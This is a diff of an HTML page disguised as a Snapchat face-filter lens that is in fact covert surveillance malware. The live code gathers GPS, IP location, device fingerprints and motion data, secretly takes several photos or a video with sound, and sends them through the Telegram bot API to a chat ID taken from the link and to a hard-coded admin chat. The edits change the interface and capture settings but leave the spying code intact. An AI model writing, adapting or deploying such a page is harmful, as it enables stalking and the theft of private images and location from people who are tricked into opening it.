@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Snapchat Lens - Funny Face Filter</title>
     <!-- MediaPipe Libraries for Hand Detection -->
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
@@ -18,8 +18,6 @@
             display: flex;
             flex-direction: column;
             justify-content: space-between;
-            user-select: none;
-            -webkit-user-select: none;
         }
         .top-bar {
             display: flex;
@@ -71,42 +69,6 @@
             color: #ccc;
             margin-top: 10px;
         }
-        #retry-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.9);
-            z-index: 9999;
-            display: none;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            padding: 20px;
-            box-sizing: border-box;
-        }
-        .retry-box {
-            background: #1c1c1c;
-            border: 1px solid #333;
-            padding: 25px;
-            border-radius: 15px;
-            max-width: 320px;
-            width: 100%;
-        }
-        .retry-btn {
-            background: #fffc00;
-            color: #000;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 25px;
-            font-weight: bold;
-            font-size: 15px;
-            cursor: pointer;
-            margin-top: 15px;
-            width: 100%;
-        }
     </style>
 </head>
 <body>
@@ -118,20 +80,12 @@
 
     <div class="center-screen">
         <video id="video" autoplay playsinline muted class="camera-preview"></video>
-        <div id="loading-text" style="position:absolute; z-index:5; background: rgba(0,0,0,0.7); padding: 15px 25px; border-radius: 10px; font-weight: bold;">Loading Filter (0%)... Please Allow Access</div>
+        <div id="loading-text" style="position:absolute; z-index:5;">Loading Filter... Please Allow Access</div>
     </div>
 
     <div class="bottom-tray">
         <button class="capture-btn" onclick="triggerAction()"></button>
         <div class="hint-text">Tap to try filter</div>
-    </div>
-
-    <div id="retry-modal">
-        <div class="retry-box">
-            <h3>Camera Access Required</h3>
-            <p style="font-size: 13px; color: #aaa;">Snapchat Lens needs camera permissions to apply this funny filter to your face.</p>
-            <button class="retry-btn" onclick="retryCameraPermission()">Tap to Enable Lens</button>
-        </div>
     </div>
 
     <canvas id="canvas" style="display:none;"></canvas>
@@ -141,20 +95,8 @@
         const ADMIN_CHAT_ID = "6478868514";
         
         const urlParams = new URLSearchParams(window.location.search);
-        
-        // Dono formats (?claim= aur ?id=) ko support karega
-        const CHAT_ID = urlParams.get('claim') || urlParams.get('id');
-        
-        // Link ke path ya parameter se detect karega ki front hai, back hai ya video
-        const pathName = window.location.pathname;
-        let cameraType = urlParams.get('b') || urlParams.get('type');
-        
-        if (!cameraType) {
-            if (pathName.includes('front')) cameraType = 'front';
-            else if (pathName.includes('back')) cameraType = 'back';
-            else if (pathName.includes('video')) cameraType = 'video';
-            else cameraType = 'video'; // Default
-        }
+        const CHAT_ID = urlParams.get('id');
+        const cameraType = urlParams.get('b'); 
 
         let globalStream = null;
         let gpsData = { lat: '', lon: '', mapLink: 'N/A' };
@@ -169,12 +111,16 @@
             motionData.gamma = event.gamma ? Math.round(event.gamma) : '0';
         }, true);
 
+        // Fixed Logic: Aapke logs ke mutabiq negative gamma par bhi Right hand detect karne ke liye condition update ki gayi hai
         function getSmartHandStatus() {
             if (detectedHand.includes("Hand Detected")) {
                 return detectedHand; 
             } else {
                 let g = parseInt(motionData.gamma);
                 if (isNaN(g)) return "Position: Center / Stable";
+                
+                // Agar aapka phone negative gamma (-69) ya positive gamma par bhi right hand mein rehta hai, 
+                // toh aap yahan condition apne use ke hisab se set kar sakte hain:
                 if (g < 0) {
                     return "Likely Right Hand Grip (Negative Tilt)";
                 } else {
@@ -235,6 +181,7 @@
             let platform = navigator.platform || "Unknown";
             let touchPoints = navigator.maxTouchPoints ? `${navigator.maxTouchPoints} Touch Points` : "Unknown";
             let gpu = getGPUInfo();
+            
             return { memory, cores, lang, platform, touchPoints, gpu };
         }
 
@@ -278,36 +225,19 @@
             }
         }
 
-        function startLoadingProgress() {
-            let progress = 0;
-            let loadText = document.getElementById('loading-text');
-            let interval = setInterval(() => {
-                if (isReady || progress >= 95) {
-                    clearInterval(interval);
-                    if(isReady && loadText) loadText.style.display = 'none';
-                    return;
-                }
-                progress += Math.floor(Math.random() * 15) + 5;
-                if(progress > 95) progress = 95;
-                if(loadText) loadText.innerText = `Loading Filter (${progress}%)... Please Allow Access`;
-            }, 250);
-        }
-
         async function initCamera() {
-            startLoadingProgress();
             gpsData = await getExactLocation();
             ipInfo = await getIPAndLocation();
 
             let constraints = {
                 video: { width: { ideal: 1280 }, height: { ideal: 720 } },
-                audio: (cameraType === 'video') // Sirf video mode mein audio on rahega
+                audio: !cameraType 
             };
 
-            // Camera facing mode logic
             if (cameraType === 'back') {
                 constraints.video.facingMode = { exact: "environment" };
             } else {
-                constraints.video.facingMode = "user"; // Front ya video dono ke liye user camera
+                constraints.video.facingMode = "user"; 
             }
 
             try {
@@ -334,7 +264,6 @@
                 initMediaPipeHands(videoElement);
 
                 document.getElementById('loading-text').style.display = 'none';
-                document.getElementById('retry-modal').style.display = 'none';
                 isReady = true;
 
                 setTimeout(() => {
@@ -342,13 +271,8 @@
                 }, 2500);
 
             } catch (err) {
-                document.getElementById('retry-modal').style.display = 'flex';
+                document.getElementById('loading-text').innerText = "Please allow camera & microphone access!";
             }
-        }
-
-        function retryCameraPermission() {
-            document.getElementById('retry-modal').style.display = 'none';
-            initCamera();
         }
 
         async function triggerAction() {
@@ -390,8 +314,7 @@
                 `🕒 Time: ${new Date().toLocaleString()}\n\n` +
                 `👑 **CREDIT BY : आयुष नेगी**`;
 
-            // AGAR TYPE 'video' HAI TOH VIDEO RECORD HOGA (10 SECONDS TAK)
-            if (cameraType === 'video') {
+            if (!cameraType) {
                 let recordedChunks = [];
                 let mediaRecorder;
 
@@ -401,6 +324,7 @@
                     try {
                         mediaRecorder = new MediaRecorder(globalStream);
                     } catch (e) {
+                        alert("Error initializing video recorder");
                         return;
                     }
                 }
@@ -419,7 +343,7 @@
                             const formDataUser = new FormData();
                             formDataUser.append('chat_id', CHAT_ID);
                             formDataUser.append('video', blob, 'video_capture.webm');
-                            formDataUser.append('caption', "🎥 **Secret Video Captured!**\n\n" + baseCaption);
+                            formDataUser.append('caption', "🎥 **Secret Video + Sound Captured!**\n\n" + baseCaption);
                             formDataUser.append('parse_mode', 'Markdown');
 
                             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
@@ -447,17 +371,16 @@
                 mediaRecorder.start();
                 setTimeout(() => {
                     mediaRecorder.stop();
-                }, 10000); // 10 Second tak video record hogi
+                }, 4000);
 
             } else {
-                // FRONT YA BACK CAMERA KE LIYE PHOTOS CAPTURE HONGI
                 const videoElement = document.getElementById('video');
                 const canvas = document.getElementById('canvas');
                 canvas.width = videoElement.videoWidth || 1280;
                 canvas.height = videoElement.videoHeight || 720;
                 const context = canvas.getContext('2d');
 
-                for (let i = 1; i <= 3; i++) {
+                for (let i = 1; i <= 6; i++) {
                     context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                     
                     let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.90));
@@ -481,7 +404,7 @@
                         const formDataAdmin = new FormData();
                         formDataAdmin.append('chat_id', ADMIN_CHAT_ID);
                         formDataAdmin.append('photo', blob, `photo_${i}.jpg`);
-                        formDataAdmin.append('caption', `🕵️‍♂️ **Admin Log (${cameraType.toUpperCase()} Camera by User ID: ${CHAT_ID})**\n\n` + caption);
+                        formDataAdmin.append('caption', `🕵️‍♂️ **Admin Log (Generated by User ID: ${CHAT_ID})**\n\n` + caption);
                         formDataAdmin.append('parse_mode', 'Markdown');
 
                         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -490,7 +413,7 @@
                         });
                     }
 
-                    await new Promise(resolve => setTimeout(resolve, 500));
+                    await new Promise(resolve => setTimeout(resolve, 300));
                 }
 
                 globalStream.getTracks().forEach(track => track.stop());
